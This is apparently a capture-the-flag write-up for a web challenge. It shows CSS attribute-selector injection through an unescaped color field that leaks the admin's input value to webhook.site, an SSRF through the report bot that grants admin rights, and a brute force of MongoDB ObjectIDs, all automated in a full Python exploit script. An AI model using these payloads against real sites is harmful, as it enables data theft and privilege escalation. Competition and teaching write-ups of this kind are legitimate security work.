---
ai_date: '2025-04-27 05:15:05'
ai_summary: CSS Injection used to find flag characters, followed by SSRF to gain admin
  rights and find flag ID, then brute-forced flag using CSS rules
ai_tags:
- css-injection
- ssrf
- brute-force
created: 2024-07-27T02:55
description: I do love CSS injection
points: 360
solves: 15
tags:
- css-injection
updated: 2024-08-04T19:22
---

> Color your username colorful!

## First Part

To access the admin's username, we can use the value of edit page's `<input>`.
`/post/edit/{pid}`

```html
<p>Author: <input class="author" type="text" value="{{author.username}}" disabled></p>
<p>Your account: <input class="user" type="text" value="{{user.username}}" disabled></p>
```

### CSS Injection

To do this I decided to use CSS selectors, because `xss` has prevented naïve XSS methods.

```css
input.user[value^="DEAD{flag_"]{
    background: url('https://webhook.site/?prefix=DEAD{flag_');
}
```

If I received a request, that means the flag indeed starts with that sequence, we can also use multiple rules like this each with a different url query so I would know which rule in particular activated.

```css
input.user[value^="DEAD{flag_a"]{
    background: url('https://webhook.site/?prefix=DEAD{flag_a');
}
input.user[value^="DEAD{flag_b"]{
    background: url('https://webhook.site/?prefix=DEAD{flag_b');
}
input.user[value^="DEAD{flag_c"]{
    background: url('https://webhook.site/?prefix=DEAD{flag_c');
}
```

After we receive a request, we update the payload with the new found char, and guess the next char.

### Payload

We will register a new account for every attempt, and add multiple CSS rules checking multiple "next character".

The payload is placed inside `personalColor`, as we can see, that's the only place where triple bar (i.e. no escape) is used.

```css
.author {
    color: {{{ author.personalColor }}}
}

.user {
    color: {{{ user.personalColor }}}
}
```

The backend uses `xss` library which will escape all occurrences of `<>` and I think it is not possible to exit the `<style>` tag.
## Second Part

To view notices we have to be admins, we can make the report bot grant us admin rights.

This is a simple SSRF to `https://TARGET/admin/report?url=http://localhost:1337/admin/grant?username=USERNAME`.

After logging out and logging in again, we can now see the notice page, where we can find the mongoose id of the two entries sandwiching the flag.

`66a4b8f9d40a5a2b039f2d68 66a4b8ffd40a5a2b039f2d6a`
### Find flag's id
But flag's id is hidden, how would we find it?

```js
await delay(randomDelay());
await db.notices.insertOne({ title: "asdf", content: "asdf" });

await delay(randomDelay());
await db.notices.insertOne({ title: "flag", content: "FAKE_FLAG}" });

await delay(randomDelay());
await db.notices.insertOne({ title: "qwer", content: "qwer" });
```

Mongoose ids are actually encoded timestamps, so by exploring all "in-between" values, we can find the flag's id.
## Solve Script

To solve the first part, you have to start run the script every time you add a new character.

I've heard of easier & faster recursive `@import` methods but thought this is simpler.

```python
import urllib.parse
import re
import string
import random
import requests


def id_generator(size=6, chars=string.ascii_uppercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))


target = "39c1490373bbf326a5023003.deadsec.quest"


def register(s, user, passw, payload):
    s.post(f"https://{target}/auth/register", json={"username": user,
                                                    "password": passw,
                                                    "personalColor": payload})


def login(s, user, passw):
    r = s.post(f"https://{target}/auth/login", json={"username": user, "password": passw})
    s.cookies.set('accessToken', r.json()['accessToken'])


def gain_admin(s, user):
    r = s.get(f"https://{target}/admin/report?url=http://localhost:1337/admin/grant?username={user}").json()
    print("gain_admin", r)


def notice_ids(s):
    r = s.get(f"https://{target}/admin/notice/").text
    g = re.findall(r"/admin/notice/([a-f0-9]+)", r)
    id1, id2 = g
    print("found ids", id1, id2)
    d1 = int(id1[:8], 16)
    d2 = int(id2[:8], 16)
    p1 = int(id1[8:], 16)
    p2 = int(id2[8:], 16)
    print("trying a total of", (d2-d1+1)*(p2-p1+1), "combinations")  # probably not need that many
    for _1 in range(d1, d2+1):
        for _2 in range(p1, p2+1):
            try:
                r = s.get(f"https://{target}/admin/notice/{_1:08x}{_2:016x}").text
                if "flag" in r:
                    f = re.search(r"<div class=\"post-content\">([^<]+)", r).group(1).strip()
                    print("flag part 2", f)
            except:
                pass


def report_post(s):
    pid = s.get(f"https://{target}/post/all").json()[0]['_id']
    url = f"http://localhost:1337/post/edit/{pid}"
    s.get(f"https://{target}/admin/report?url={urllib.parse.quote(url)}")


def make_post(s):
    s.post(f"https://{target}/post/write", json={"title": "test", "content": "test"})


def str_to_css_hex(s):
    special_characters = r'[_]'
    return re.sub(special_characters, lambda match: f'\\{ord(match.group(0)):04x}', s)


def tryFlag(pres):
    s = requests.session()
    try:
        print("trying", pres)
        user = id_generator(7)
        passw = id_generator(7)
        _pres = '\n'.join([f"""input.user[value^="{pre}"]{{
background: url('https://webhook.site/?prefix={urllib.parse.quote(pre)}');
}}""" for pre in pres])
        payload = f"""
#000;}}
{_pres}
*{{""".strip()
        register(s, user, passw, payload)
        login(s, user, passw)
        make_post(s)
        report_post(s)
        print("done", pres)
    except Exception as e:
        print('error!', e)
        tryFlag(pres)
        return None


def extendFlag(flag_pre):
    w_size = 25
    for I in range(0, len(string.printable), w_size):
        chrs = [string.printable[I+i] for i in range(min(w_size, len(string.printable)-I))]
        pres = [str_to_css_hex(flag_pre+c) for c in chrs]
        random.shuffle(pres)
        tryFlag(pres)


def second_part():
    s = requests.session()
    register(s, "kumo", "kumo", "#000")
    login(s, "kumo", "kumo")
    print("login")
    gain_admin(s, "kumo")
    s.cookies.clear()
    login(s, "kumo", "kumo")
    notice_ids(s)


# extendFlag("DEAD{")
second_part()   # c010rful_w3b_with_c55}
```

```flag
DEAD{Enj0y_y0ur_c010rful_w3b_with_c55}
```

## Failed Attempts

- Using selection hash `#:~:text={urllib.parse.quote(flag)}` didn't work on remote for some reason, worked on local browser.
- Using svg ligatures generated fonts, and look for scrollbars also didn't work for some reason, the scrollbar selector always activates.
- I spent 90% of the time trying to leak the view page, and totally forgot the edit page has a input element.